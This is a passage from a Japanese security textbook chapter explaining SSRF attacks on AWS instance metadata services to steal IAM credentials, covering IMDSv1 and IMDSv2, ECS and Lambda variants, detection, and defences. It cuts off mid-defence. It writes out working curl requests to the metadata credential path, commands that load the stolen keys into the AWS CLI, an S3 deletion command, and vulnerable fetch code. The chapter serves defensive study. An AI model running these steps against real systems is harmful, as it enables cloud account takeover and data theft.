# 第2章 SSRF→メタデータサービス→一時クレデンシャル窃取

## AWS IMDSの基礎とSSRFからのクレデンシャル窃取（決定版）

### この節で扱うこと

SSRF（Server-Side Request Forgery、サーバー側でアプリケーションに任意のURLへリクエストを発行させる脆弱性）は、単体では「サーバーが代わりに通信してくれる」だけの問題に見えることがある。しかしクラウド環境、特にAWS EC2インスタンス上で動くアプリケーションがSSRFを持つ場合、その先には**インスタンスメタデータサービス（IMDS: Instance Metadata Service）**という、そのインスタンス自身に紐づくIAMロールの一時クレデンシャル（一時的なアクセスキー・シークレットキー・セッショントークンの組）を配布する内部APIが存在する。攻撃者はSSRFを踏み台にしてIMDSへアクセスし、そのクレデンシャルを窃取して、EC2インスタンスが持つIAM権限をまるごと乗っ取ることができる。これは「サーバー内部の情報漏洩」ではなく、多くの場合「クラウドアカウント全体の侵害」に直結する、クラウド特有かつ最重要のSSRF帰結である。

本節では、IMDSv1とIMDSv2の仕組みの違い、具体的な攻撃手順、実際の攻撃連鎖、そして防御策を体系的に解説する。

### IMDS（インスタンスメタデータサービス）とは何か

EC2インスタンスは起動時、OSやアプリケーションが自分自身の情報（インスタンスID、AMI ID、ネットワーク設定、そして最も重要な**IAMロールの一時クレデンシャル**）を取得できるよう、特別なHTTPエンドポイントを内部に持つ。これがIMDSであり、常に**リンクローカルアドレス`169.254.169.254`**上でリッスンしている。

> ⚠️ **未取得の資料の補足として**：`169.254.169.254`はIPv4のリンクローカルアドレス空間（169.254.0.0/16）に属し、ルーティングされずそのホスト（正確にはハイパーバイザー経由でEC2インスタンスに提供される仮想NIC）からのみ到達可能という前提でAWSは設計している。つまり本来「そのインスタンス自身のOS・アプリケーションだけがアクセスできる」ことを暗黙の信頼境界としている。SSRFはこの信頼境界を、外部の攻撃者が「サーバーに代理リクエストさせる」ことで内側から突破してしまう攻撃である。

IAMロールをアタッチされたEC2インスタンスでは、次のパスを辿ることでロールの一時クレデンシャルを取得できる。

```
GET http://169.254.169.254/latest/meta-data/iam/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

- 1段目：`iam/`配下が存在する＝そのインスタンスに何らかのIAMロールがアタッチされていることを示す（404ならロールなし＝この経路での攻撃は不成立）。
- 2段目：アタッチされているロール名を返す（複数ロールが返る構成もある）。
- 3段目：ロール名を指定すると、`AccessKeyId`・`SecretAccessKey`・`Token`（セッショントークン）・有効期限（`Expiration`）を含むJSONが返る。

> 出典: Hacking Articles — AWS EC2 Credentials Theft via SSRF Abuse — https://www.hackingarticles.in/aws-ec2-credentials-theft-via-ssrf-abuse/

この記事のラボでは、IAMロール`ec2-admin`（管理者級の広い権限を持つロール）がEC2インスタンス`lgt_server`にアタッチされている想定で、次のように段階的にメタデータを引き出している。

```
http://65.1.93.95/fetch.php?url=http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin
```

最後のリクエストで得られるレスポンスには`AccessKeyId`・`SecretAccessKey`・`SessionToken`が含まれており、これをそのまま環境変数にセットすればAWS CLIから正規のAPI呼び出しが可能になる。

```bash
export AWS_ACCESS_KEY_ID=ASIAXPJ...
export AWS_SECRET_ACCESS_KEY=SvEMItwhRPI+0FZf...
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEIX..."

aws sts get-caller-identity   # 誰として認証されているかの確認
aws s3 ls s3://igt-bucket/    # 窃取した権限でS3を列挙
aws s3 rm s3://igt-bucket/secrets.txt  # 権限次第では破壊的操作も可能
```

なぜこれが致命的なのか。この一時クレデンシャルは**AWS STS（Security Token Service）が発行した正規の認証情報**であり、IMDS経由で取得した時点でAWS側から見れば「そのIAMロールとして振る舞う正規の呼び出し」と区別がつかない。EC2インスタンス自体を侵害せずとも、Webアプリケーションの一つのSSRFバグだけで、インスタンスが持つIAM権限をまるごと奪える。ラボの例のように、S3の閲覧に加えて削除（`rm`）まで可能な設計であれば、機密情報の窃取に留まらずデータ破壊・ランサム的な悪用にまで発展し得る。

> 出典: Hacking Articles — AWS EC2 Credentials Theft via SSRF Abuse — https://www.hackingarticles.in/aws-ec2-credentials-theft-via-ssrf-abuse/

（本書では防御目的の学習に限定し、実在環境に対する検証・破壊的操作は行わない。上記コマンド例は攻撃者視点の手口を理解し、防御側が検知・遮断すべきポイントを把握するための引用である。）

### SSRFがIMDSに到達する経路：脆弱なコード例

なぜSSRFがこの攻撃を可能にするのか、原理を見ておく。Hacking Articlesの記事では、URLパラメータをそのままサーバー側で取得（フェッチ）する典型的な脆弱コードが例示されている。

```php
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    $content = file_get_contents($url);
    echo $content;
}
?>
```

このコードの問題は、`url`パラメータの値に対して**検証もフィルタリングも一切行っていない**ことにある。`file_get_contents()`はスキーム（`http://`, `file://`など）とホストを問わずリクエストを発行できるため、攻撃者が`url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin`のような値を渡せば、サーバー自身がそのリクエストを（あたかも自分自身が発行したかのように）実行し、結果をそのまま応答本文として返してしまう。

つまりSSRFの本質は「**sink（入力が最終的に到達し、危険な処理へ渡される箇所）**である`file_get_contents`のようなURL取得関数に、ユーザー入力（source）が未検証で流れ込むこと」であり、IMDS窃取はその中でも「到達先がクラウドメタデータという、極めて価値の高い内部APIである」特殊ケースにあたる。

> 出典: Hacking Articles — AWS EC2 Credentials Theft via SSRF Abuse — https://www.hackingarticles.in/aws-ec2-credentials-theft-via-ssrf-abuse/

Resecurityの記事も同様に、クエリパラメータ経由でプロキシ的にURLを取得させる構造を典型パターンとして挙げている。

```
GET /proxy?url=http://169.254.169.254/latest/meta-data/
```

こうした「URLフェッチ機能」「Webhookプレビュー」「画像URLの取り込み」「PDF生成のためのURLレンダリング」「外部APIプロキシ」など、サーバーがユーザー指定のURLに対して通信を行う機能は、すべてIMDSへの到達経路になり得る。

> 出典: Resecurity — SSRF to AWS Metadata Exposure: How Attackers Steal Cloud Credentials — https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials

### IMDSv1とIMDSv2の違い：なぜバージョンが防御の分水嶺になるのか

ここが本節の核心である。AWSは2019年にIMDSv2を導入し、SSRF経由のメタデータ窃取に対する緩和策として位置づけた。両者の違いを仕組みレベルで理解する。

**IMDSv1（レガシー方式）**

単純な`GET`リクエストだけで、認証なしにメタデータへアクセスできる。

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin
```

この方式の問題は、**HTTPの`GET`メソッドと、送信元がホスト自身であることだけ**に依存しており、リクエストが「本当にそのホスト上で動くOSやアプリケーションが自発的に発行したものか」「外部から注入された（SSRF経由の）ものか」を一切区別できないことにある。多くのSSRF脆弱性（URLフェッチ、画像プロキシ、Webhookなど）は単純な`GET`リクエストの中継しかできないが、IMDSv1はまさにその`GET`だけで完結するため、極めて相性良く悪用されてしまう。

**IMDSv2（トークンベース方式）**

IMDSv2では、メタデータを取得する前に、まず`PUT`メソッドでセッショントークンを要求する必要がある。

```bash
# ステップ1: PUTリクエストでトークンを取得（TTLを秒単位で指定）
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# ステップ2: 取得したトークンをヘッダーに付けてメタデータへアクセス
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-admin
```

（このコマンド例は本書がIMDSv2の仕組みを説明するために一般的なAWSの公開情報に基づいて構成したものであり、防御側が挙動を理解するための参考である。実環境での実行はAWSの利用規約・自組織のポリシーに従うこと。）

IMDSv2がSSRFに強い理由は主に2点ある。

1. **`PUT`メソッドかつカスタムヘッダーが必須**であること。多くのSSRF脆弱性（URLをそのままフェッチするだけの機能）は`GET`しか発行できず、攻撃者が任意のHTTPメソッドやカスタムヘッダーを注入できない。そのため、トークン取得の`PUT`リクエスト自体を成立させられず、攻撃の入口で詰まる。
2. **ホップ制限（デフォルトでホップ数1）**。EC2インスタンスはIMDSv2のトークン応答に対してTTL（Time To Live、IPパケットの転送可能回数）を1に設定でき、これによりロードバランサやプロキシを一段介しただけでリクエストが到達しなくなるよう設計できる。これはSSRFが典型的にアプリケーションサーバー内部の別プロセス（リバースプロキシ等）を経由する構成を想定した緩和策である。

Hacking The Cloudの記事は、この効果を端的にまとめている。

> "IMDSv2 would significantly reduce the risk of an adversary stealing IAM credentials via SSRF or XXE attacks"
> （IMDSv2はSSRFやXXE攻撃を介した攻撃者によるIAMクレデンシャル窃取のリスクを大幅に低減する）

> 出典: Hacking The Cloud — Steal EC2 Metadata Credentials via SSRF — https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/

ただし重要な注意点として、**IMDSv2は「GETしか送れない単純なSSRF」を防ぐものであり、万能の防御ではない**。次のようなケースではIMDSv2があっても窃取が成立し得る。

- SSRFの脆弱性が**任意のHTTPメソッドとヘッダーを注入可能**なタイプ（例: サーバー側でリクエストのメソッドやヘッダーをある程度制御できるSSRF、あるいはリバースプロキシの設定不備によりクライアント指定のヘッダーがそのまま内部リクエストに転送されるケース）である場合、攻撃者は`PUT`でのトークン取得から`GET`でのメタデータ取得までの2段階を両方実行できてしまう。
- アプリケーション自体がIMDSv2のトークンをキャッシュして保持しており、SSRFによってそのキャッシュ値（あるいはトークンを使ってメタデータを取得済みのレスポンス）が読み出せる場合。
- 古いAWS SDKやミドルウェアがIMDSv1にフォールバックする設定のままになっている場合（後述のホップ制限やv1無効化設定がされていない構成）。

このため、IMDSv2の有効化は極めて有効な緩和策ではあるが、「IMDSv2にしているから安全」という誤った安心につながらないよう、後述する多層防御（ネットワーク遮断・最小権限）と組み合わせることが前提となる。

> 出典: Hacking The Cloud — Steal EC2 Metadata Credentials via SSRF — https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/

Resecurityの記事も、"IMDSv2を強制しない限り、デフォルトのままではアクセス可能"と指摘しており、**IMDSv1とIMDSv2を両方許可したまま**にしている構成（AWSのデフォルトの後方互換設定）こそが最大のリスクだと強調している。

> 出典: Resecurity — SSRF to AWS Metadata Exposure: How Attackers Steal Cloud Credentials — https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials

Hacking Articlesのラボでも同様に、"V1とV2（トークンオプション）の両方が有効化されている"構成が脆弱性の一因として名指しされている。本番環境では**「IMDSv2のみを必須（`HttpTokens: required`）」に設定し、IMDSv1を完全に無効化する**ことが推奨される。

> 出典: Hacking Articles — AWS EC2 Credentials Theft via SSRF Abuse — https://www.hackingarticles.in/aws-ec2-credentials-theft-via-ssrf-abuse/

### 攻撃連鎖の全体像

Hacking Articlesの記事は、この攻撃を1つのSSRF脆弱性から始まり、クラウド環境全体の侵害へと至る攻撃連鎖（キルチェーン）として図解している。

```
限定的な権限を持つIAMユーザー（攻撃者が別経路で入手した低権限アカウント）
    ↓
Webアプリケーションに存在するSSRF脆弱性を悪用
    ↓
SSRF経由でIMDS（169.254.169.254）へアクセス
    ↓
アタッチされているIAMロールの一時クレデンシャルを窃取
    ↓
窃取したクレデンシャルでEC2インスタンスのIAMロールになりすます
    ↓
そのロールが持つ権限を列挙（多くの場合、開発時の利便性のために過度に広い権限が付与されている）
    ↓
S3・EC2など他のAWSリソースへ横展開
    ↓
AWS環境全体の侵害（データ窃取・破壊・追加の権限昇格）
```

> 出典: Hacking Articles — AWS EC2 Credentials Theft via SSRF Abuse — https://www.hackingarticles.in/aws-ec2-credentials-theft-via-ssrf-abuse/

このラボが示す重要な教訓は、**低権限のIAMユーザーしか持たない攻撃者でも、SSRF一つでEC2インスタンスの（しばしばより強力な）IAMロールへと権限を昇格できる**ということである。これはIAMロールの権限設計（最小権限の原則）が、SSRFという一見無関係な脆弱性の被害規模を直接左右することを意味する。ロールが必要最小限のS3読み取り権限しか持たなければ被害はその範囲に限定されるが、`AdministrativeAccess`のような広範な権限が付与されていれば、被害はアカウント全体に及ぶ。

### 実被害の規模：自動化されたスキャンの存在

これは理論上の脅威ではなく、実際に自動化された攻撃として観測されている。Hacking The Cloudの記事では、セキュリティベンダーMandiant（Google Cloud傘下の脅威インテリジェンス企業）が、SSRF脆弱性を悪用してIMDSクレデンシャルを窃取する**自動化されたスキャン（automated scanning）**を確認していることに言及している。つまり攻撃者は個々のターゲットを手動で狙うのではなく、インターネット上でSSRFの疑いがある入力点（URLフェッチ機能など）を広く走査し、そこにIMDS宛のペイロードを機械的に投げ込むボットのような手法で、無差別にクレデンシャルを収集していることを意味する。この事実は、「うちは狙われるほど有名ではない」という油断が通用しないことを示している。

> 出典: Hacking The Cloud — Steal EC2 Metadata Credentials via SSRF — https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/

### 攻撃が可能にすること：影響の全体像

Resecurityの記事は、SSRFからIMDS窃取に至った場合の影響を5つに整理している。

- **クラウド認証情報の盗難**：一時的とはいえ有効期限内（デフォルトでは数時間〜最大36時間程度に設定可能）は正規の認証情報として使い放題になる。
- **内部ネットワークスキャニング**：SSRF自体がそのまま内部ネットワークへのポートスキャン・サービス探索の踏み台にもなる。
- **内部APIへのアクセス**：VPC内部にのみ公開された管理API・データベース管理画面などへの到達。
- **ファイアウォール迂回**：外部から直接到達できないリソースへ、信頼されたサーバー経由でアクセスできてしまう。
- **インフラへの横展開**：窃取したIAM権限を起点に、他のEC2インスタンス、S3バケット、Lambda関数など周辺リソースへと侵害を広げる。

> 出典: Resecurity — SSRF to AWS Metadata Exposure: How Attackers Steal Cloud Credentials — https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials

特に「IAMロール権限が広範な場合、盗まれた認証情報でS3やDynamoDB、EC2へのアクセスが可能」になる点は、前述のIAM最小権限の原則の重要性と直結する。

### 防御策：多層防御としてのまとめ

3つの資料が共通して挙げる防御策を、実装の優先度が高い順に整理する。

**1. IMDSv2の必須化（IMDSv1の無効化）**

最も直接的かつ効果の大きい対策。EC2インスタンスのメタデータオプションで`HttpTokens`を`required`に設定し、`HttpPutResponseHopLimit`を1（デフォルト）のまま維持することで、単純な`GET`ベースのSSRFからの窃取をほぼ無効化できる。AWS CLIやTerraform、CloudFormationのいずれからも設定可能であり、既存インスタンスにも後から適用できる。

> 出典: Hacking The Cloud / Resecurity / Hacking Articles（3記事共通の推奨事項）

**2. 入力検証とURLホワイトリスト化**

SSRFの根本原因である「ユーザー入力を検証せずにサーバー側で取得する」実装そのものを是正する。具体的には、許可するホスト名・スキームをホワイトリスト方式で限定し、リンクローカルアドレス（`169.254.0.0/16`）やプライベートアドレス（`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`）、`localhost`/`127.0.0.1`宛のリクエストを明示的に拒否する。DNSリバインディング（名前解決結果が検証後に変わる攻撃）にも配慮し、検証したIPアドレスに対して実際に接続する実装（TOCTOU、Time-Of-Check to Time-Of-Useの不整合を避ける実装）が望ましい。

> 出典: Resecurity — SSRF to AWS Metadata Exposure — https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials

**3. ネットワークレベルでのアクセス制限**

アプリケーション層の防御だけに頼らず、ホストのファイアウォール（`iptables`やセキュリティグループに相当するホスト側制御）で、アプリケーションプロセスの実行ユーザーから`169.254.169.254`への通信を遮断する多層防御も有効である。コンテナ環境（ECS/EKS）ではタスクロールの認証情報エンドポイントが別アドレスになる点に注意しつつ、同様の原則（メタデータエンドポイントへの到達をアプリケーションの信頼境界の外に置かない）を適用する。

> 出典: Resecurity — SSRF to AWS Metadata Exposure — https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials

**4. IAMロールの最小権限原則**

たとえIMDS窃取が成立しても、被害範囲を限定するための最後の防波堤。Hacking Articlesのラボが示すように、`ec2-admin`のような広範な管理者権限をEC2インスタンスに付与すること自体がリスクの核心である。インスタンスが実際に必要とするAPIアクション・リソースのみをIAMポリシーで許可し、`AdministratorAccess`のようなAWS管理ポリシーの安易なアタッチは避ける。

> 出典: Hacking Articles — AWS EC2 Credentials Theft via SSRF Abuse — https://www.hackingarticles.in/aws-ec2-credentials-theft-via-ssrf-abuse/

**5. ロギングと異常検知**

CloudTrailでIMDS経由のクレデンシャル利用を監視し（`userIdentity`内のセッションコンテキストから、通常と異なるIPアドレス・地理的位置からのAPI呼び出しを検知）、アプリケーション側でも外部URLフェッチの試行ログを記録し、内部IPレンジへのリクエストパターンを異常として検知する仕組みを整える。

> 出典: Hacking Articles — AWS EC2 Credentials Theft via SSRF Abuse — https://www.hackingarticles.in/aws-ec2-credentials-theft-via-ssrf-abuse/

### まとめ

SSRFは一般的には「情報漏洩」や「内部ネットワークへの到達」のリスクとして語られがちだが、AWS環境においては**IMDSという単一のリンクローカルエンドポイントを経由するだけで、クラウドアカウント全体を乗っ取り得る特権昇格経路**に直結する。IMDSv1が単純な`GET`リクエストのみで認証なしにクレデンシャルを配布してしまう設計上の弱点を持つのに対し、IMDSv2は`PUT`メソッドとカスタムヘッダーによるトークン取得を必須化し、ホップ制限を組み合わせることで、多くのSSRFパターンからの窃取を防ぐ。しかしこれは万能ではなく、IAMの最小権限原則・入力検証・ネットワーク遮断・監視という多層防御と組み合わせて初めて実効性を持つ。次節以降では、この窃取したクレデンシャルを起点にどのように権限昇格・横展開が行われるか、より具体的なケースを見ていく。

## IMDSv1窃取の実手順（curl/ECS/Lambda）

前節ではSSRFがクラウド環境で「単なる内部リクエスト強制」から「クラウド管理者権限の奪取」に化ける原理を扱った。本節では、その核心である**IMDS(Instance Metadata Service)**からのクレデンシャル窃取を、実際に叩くリクエストのレベルまで分解する。読者が到達すべきゴールは、「なぜ`curl`一発でIAMロールの一時クレデンシャルが取れてしまうのか」をプロトコルの挙動として説明できるようになることと、EC2以外の実行基盤(ECS、Lambda)でも構造は違えど同じ問題が起きうることを理解することである。

### IMDSとは何か、なぜ「認証なし」なのか

IMDSは、EC2インスタンス（および後述するECS/Lambdaなど派生実行環境）が「自分自身の情報」を取得するために用意された、リンクローカルアドレス`169.254.169.254`上で動くHTTPサーバーである。ここでいう「リンクローカル」とは、ルーティングされない（インターネットからは絶対に到達できない）特殊なIPアドレス帯（`169.254.0.0/16`）を指し、そのインスタンス内部からのみアクセス可能という前提で設計されている。

IMDSv1（初期設計、2012年頃から存在）は、この「インスタンス内部からしか届かない」という前提だけを安全性の根拠にしていた。つまり、リクエスト自体に**トークンも認証ヘッダーも一切不要**で、単純な`GET`リクエストを投げれば誰でも（インスタンス上で動くどんなコードでも）応答が返ってくる。これが後述する脆弱性の根本原因である。

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
```

最後のエンドポイントは、そのインスタンスにアタッチされたIAMロールの**一時クレデンシャル**（`AccessKeyId`、`SecretAccessKey`、セッション`Token`、`Expiration`）をJSON形式でそのまま返す。この一時クレデンシャルは、アタッチされたIAMロールとまったく同じ権限を持つ。

> ⚠️ **重要**: ここで返るのはロール名を知っている人間向けの「秘密の情報」ではなく、**リクエストさえ届けば誰でも取れる情報**である。SSRFはまさに「本来インスタンス内部のコードしか投げられないはずのリクエストを、外部の攻撃者が任意のURLとして注入する」ことでこの前提を破壊する。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### 攻撃の前提条件（この4つが揃うと危険）

複数の資料が共通して挙げる前提条件は以下の通りである。

1. **アプリケーション層のSSRF脆弱性**が存在し、ユーザー指定のURL（またはURLの一部）をサーバー側が取得しにいく処理がある（例: URLプレビュー機能、Webhook登録、画像取り込み、PDF生成でのリモートリソース取得など）。
2. そのインスタンス/実行基盤で**IMDSv1が有効**（IMDSv2が「必須」に強制されていない）。
3. 出力先IPに対する**フィルタリングがない**（プライベートIPレンジやリンクローカルアドレスへのアウトバウンドがブロックされていない）。
4. アプリケーションがサーバー側で`requests.get()`のようなライブラリ呼び出しでURLを取得する実装になっている。

> 出典: RKON「Exploit SSRF to gain AWS Credentials」— https://www.rkon.com/articles/exploit-ssrf-to-gain-aws-credentials/

### 脆弱なコードの典型例

AquilaXの記事では、URLプレビュー機能を模した以下のFlaskエンドポイントが例として示されている。

```python
@app.route("/preview")
def preview():
    url = request.args.get("url")
    resp = requests.get(url, timeout=5)
    return jsonify({"content": resp.text})
```

このコードの問題は、`url`パラメータに対して**スキーム検証もホスト検証も一切行わず**、そのまま`requests.get()`に渡している点にある。攻撃者が`url=http://169.254.169.254/...`を指定すると、サーバー（＝EC2インスタンス自身）がIMDSに対してリクエストを発行し、その応答をレスポンスボディとして攻撃者に返してしまう。これは「攻撃者がインスタンス内部にいるコードを間接的に操作している」のと等価であり、SSRFが「内部専用の信頼境界を、外部からのHTTPパラメータ一つで踏み越えさせる」脆弱性である所以がここにある。

RKONの記事では同種の脆弱性がPHPの感情分析（センチメント分析）アプリケーションで再現されており、ユーザー入力を検証せずに外部URLとして解析対象に渡す実装が同じ構造の穴を作っている。

> 出典: RKON「Exploit SSRF to gain AWS Credentials」— https://www.rkon.com/articles/exploit-ssrf-to-gain-aws-credentials/

### curlでの実攻撃手順（60秒で完了する理由）

AquilaXの記事は、悪用チェーン全体を以下の3ステップに整理している。実際の攻撃はSSRFの脆弱なパラメータを経由して行うため、下記の`curl`は「攻撃対象アプリケーションのプレビュー機能を経由してIMDSにリクエストを転送させる」形になる。

**ステップ1: ロール名の列挙**

```bash
curl "https://app.example.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

このエンドポイントは、インスタンスにアタッチされているIAMロール名の一覧をプレーンテキストで返す。ロール名がわからなくても、まずこの一覧取得だけでロール名（例: `app-production-role`）を特定できる。

**ステップ2: クレデンシャルの抽出**

```bash
curl "https://app.example.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role"
```

応答としてJSONで一時クレデンシャルがそのまま返る。以下は典型的な応答形式である。

```json
{
  "Code": "Success",
  "LastUpdated": "2026-09-21T00:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXXXXXXXXXXXXXXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/...",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-09-21T06:00:00Z"
}
```

**ステップ3: AWS CLIへの設定と権限の悪用**

```bash
export AWS_ACCESS_KEY_ID=ASIAXXXXXXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/...
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjE...

aws sts get-caller-identity   # 取得した権限の確認
aws s3 ls                     # 例: S3バケット列挙
```

こうして取得した一時クレデンシャルは、そのロールが持つ権限（`s3:*`、`ec2:*`、`iam:*`など、しばしば過剰に付与されている）をそのまま外部から行使できる。AquilaXはこの一連の流れが**特別なエクスプロイトコードなしに60秒未満で完了する**と述べており、「難しい攻撃」ではなく「curlが打てれば誰でも再現できる攻撃」であることが最大の危険性である。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

RKONの記事も同型の攻撃フローを示しており、まず`http://ifconfig.me`のような無害なURLでSSRFの挙動（サーバー側がリクエストを本当に発行しているか）を確認してから、本命のIMDSエンドポイントに切り替えるという偵察の順序を推奨している。これは、いきなり機微なエンドポイントを叩いて検知アラートを誘発するのを避け、まずSSRFの存在自体を安全に確証するという実務的な手順である。

> 出典: RKON「Exploit SSRF to gain AWS Credentials」— https://www.rkon.com/articles/exploit-ssrf-to-gain-aws-credentials/

### なぜIMDSv2でも安心しきれないのか

IMDSv2は、まず`PUT`リクエストでセッショントークンを取得し、以降のメタデータ取得リクエストにそのトークンを`X-aws-ec2-metadata-token`ヘッダーとして付与しなければならない、という2段階の仕組みを導入した。これにより、単純な`GET`だけを転送するタイプのSSRF（例えば、リダイレクトを追従するだけの実装や、GETメソッド固定のプロキシ型SSRF）は原理的に防がれる。

```hcl
metadata_options {
  http_tokens                 = "required"
  http_put_response_hop_limit = 1
}
```

しかし、以下のケースでは依然としてIMDSv2下でも窃取が成立しうる。

- **IMDSv1がそもそも無効化されていない**: IMDSv2は「オプトイン」の設計であり、`HttpTokens`が`required`に明示的に設定されていない限りIMDSv1は生き続ける。
- **SSRFが任意メソッド（PUT含む）を発行できる場合**: アプリケーション側のSSRFがHTTPメソッドを自由に選べる実装（例えばWebhookのカスタムメソッド指定や、SSTIを介した任意HTTPクライアント呼び出し）であれば、攻撃者はPUTでトークンを取得し、続くGETにそのトークンを付与するという2段階を両方ともSSRF経由で再現できる。
- **リダイレクトチェーン**: 攻撃者が制御するドメインへの通常のリクエストが、そこからHTTPリダイレクトでメタデータエンドポイントへ転送されるよう仕込まれているケース。
- **hop-limitはプロキシ転送を防ぐためのものであり、アプリケーション自身が直接投げるリクエストは制限しない**: `HttpPutResponseHopLimit`（デフォルト値1）は、コンテナ経由などでホップ数が増えるリクエストを止める仕組みであり、アプリケーションコード自身が直接IMDSにリクエストする場合には無関係である。

HackIndexの記事は、IMDSv1が有効かどうかを外部からの偵察・非侵入的なやり方で判定する手段として、AWS APIレベルでの検出とインスタンスシェル内での検出の2通りを挙げている（後者は防御側の監査手順として有用）。

```bash
# インスタンス内部シェルから: 200ならIMDSv1有効、401ならIMDSv2強制済み
curl -s -o /dev/null -w '%{http_code}\n' http://169.254.169.254/latest/meta-data/
```

また、`describe-instances`のフィルタで`MetadataOptions.HttpTokens==optional`を検索することで、組織内でIMDSv1が有効なままのインスタンスを全リージョン横断で洗い出せることも指摘されている。これは攻撃者の偵察手段であると同時に、防御側が自組織の棚卸しに使うべき手順でもある。

> 出典: HackIndex「SSRF to IMDS Credential Theft」— https://hackindex.io/platforms/aws/exploitation/ec2/ec2-ssrf-imds-credential-theft

### ECSでのクレデンシャル窃取（構造が違う理由）

ECS（Elastic Container Service）タスクはEC2インスタンスとは異なるクレデンシャル供給経路を持つ。ECSタスクには`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`という環境変数が注入されており、これが以下のようなタスク固有のエンドポイントを指す。

```
http://169.254.170.2/v2/credentials/[uuid]
```

このアドレス`169.254.170.2`はEC2の`169.254.169.254`とは別のリンクローカルアドレスであり、**タスクごとに異なるUUIDパス**を持つことでタスク間のクレデンシャル分離を意図している。しかし、SSRF単体ではこのUUIDを知らないと取得できない一方、環境変数自体が別の脆弱性（例えばパストラバーサルやテンプレートインジェクションによる環境変数の漏えい）で露出してしまえば、SSRFと組み合わせて直接クレデンシャルを取りに行ける。つまりECSでは「IMDSのロール名列挙」に相当するステップが「環境変数からUUID付きURLを盗み出す」ステップに置き換わるだけで、**攻撃の骨格（認証なしのローカルHTTPエンドポイントから一時クレデンシャルを取得する）は同一**である。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### Lambdaでのクレデンシャル露出（IMDSを経由しない別経路）

Lambda関数はEC2ともECSとも異なり、実行環境自体がメタデータサービスを持たない。その代わり、Lambdaは呼び出しごとに一時クレデンシャルを**環境変数**として直接実行コンテキストに注入する（`AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`、`AWS_SESSION_TOKEN`）。

このため、Lambda環境での「IMDS窃取」に相当する攻撃は、SSRFで`169.254.169.254`を叩くことではなく、**サーバーサイドテンプレートインジェクション（SSTI）や環境変数を読み出せる任意のコード実行/情報漏えい経路**を通じて、プロセスの環境変数そのものを読み出す形を取る。例えばNode.jsのLambdaでSSTIが成立すれば、`process.env`を出力させるだけでクレデンシャルが漏れる。これはIMDSのHTTPエンドポイントを叩く操作とは経路が異なるものの、「実行基盤が用意した認証情報の受け渡し場所に、本来アクセスできないはずの経路からアクセスできてしまう」という本質は共通している。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### 影響の大きさ（実例で理解する）

この種のSSRF→IMDS窃取チェーンは、単体のCVSSスコアで見ても8.8〜9.8（ネットワークからアクセス可能、認証不要、機密性への影響が高い）に分類されることが多い。実例として最も有名なのは2019年のCapital One事件で、WAF（Web Application Firewall）を稼働させていたEC2インスタンスに対するSSRFがIMDS経由でクレデンシャル窃取に悪用され、約1億件の顧客レコードが外部に持ち出された。この事件は「WAFという防御製品自体がSSRFの踏み台になった」という点でも象徴的であり、対策の実装漏れがどのレイヤーにあっても同じ結果に至ることを示している。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### 検知の手がかり（防御側の視点）

窃取されたクレデンシャルが外部から使われた場合、CloudTrailのログには**そのロールのARNが、インスタンス自身のプライベートIPではない外部IPから利用された記録**が残る。これは強い異常シグナルであり、GuardDutyには`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`という専用の検出項目が用意されている。静的解析（Semgrep、CodeQL、Snyk Codeなどのテイント解析ベースのSASTツール）はSSRFの入力元（source、ユーザーが制御できる入力）と出力先（sink、実際にHTTPリクエストが発行される箇所）が明示的に宣言されているパターンであれば検出できるが、動的な文字列結合や間接呼び出しを経由するパターンは見逃されやすい。

> 出典: AquilaX「SSRF to AWS Credential Theft via IMDSv1」— https://aquilax.ai/blog/ssrf-cloud-metadata-credential-theft

### 防御策（本節のまとめ）

本節で扱った防御目的の要点を、実装レベルで整理する。

**1. IMDSv2の強制（最重要かつ最も費用対効果が高い対策）**

```bash
# 稼働中インスタンスに対して個別に強制する場合
